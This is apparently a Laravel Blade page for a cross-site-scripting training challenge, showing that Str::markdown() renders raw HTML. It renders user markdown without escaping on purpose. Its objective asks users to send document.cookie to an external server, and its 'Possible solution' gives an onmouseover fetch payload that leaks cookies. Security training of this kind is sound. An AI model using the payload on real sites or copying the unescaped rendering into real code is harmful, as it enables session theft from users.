<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Challenge 5</title>
    <style>
        body {
            background-color: #fff;
        }

        .fw {
            position: absolute;
            top: 0px;
            right: 0px;
            bottom: 0px;
            left: 0px;
            z-index: 1;
            overflow: hidden;
        }

        .ct {
            z-index: 10;
            position: relative;
        }
    </style>
</head>

<body>

    <p><a href="/day1/challenge5">Reset form</a></p>

    <h1>Markdown</h1>

    <p>Markdown is not safe to use as is.</p>

    <blockquote>
        Text between < and> that looks like an HTML tag is parsed as a raw HTML tag and will be rendered in HTML without
            escaping. Tag and attribute names are not limited to current HTML tags, so custom tags (and even, say,
            DocBook tags) may be used.</blockquote>

    <p>With this in mind, we cannot trust default Markdown methods and packages to be safe for user input, and to prove
        it, this challenge uses Laravel's Str::markdown() helper without any options. Hack it!


    <h2>Objective</h2>

    <ul>
        <li>Send the value of `document.cookie` to `GET
            https://server.kevincunningham.co.uk/xss/five?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
        </li>
    </ul>

    <details>
        <summary>Possible solution</summary>
        <pre>

&lt;a href="#" onmouseover="fetch('http://localhost:3000/xss/five?name=Kevin&cookie='+document.cookie)"&gt;This is a link&lt;/a&gt;
</pre>
    </details>
    <form method="POST">
        @csrf
        <p>Add some markdown</p>
        <div>
            <textarea type="text" name="search" id="description" style="width: 95%" placeholder="Some markdown"
                value="{!! strip_tags(request()->get('search')) !!}" />
            </textarea>
        </div>
        <p><button type="submit">Search!</button></p>
    </form>

    @if (request()->isMethod('POST'))
        <h3>Submitted Description:</h3>
        <div>{!! Str::markdown(request()->input('search')) !!}</div>
    @endif

</body>

</html>
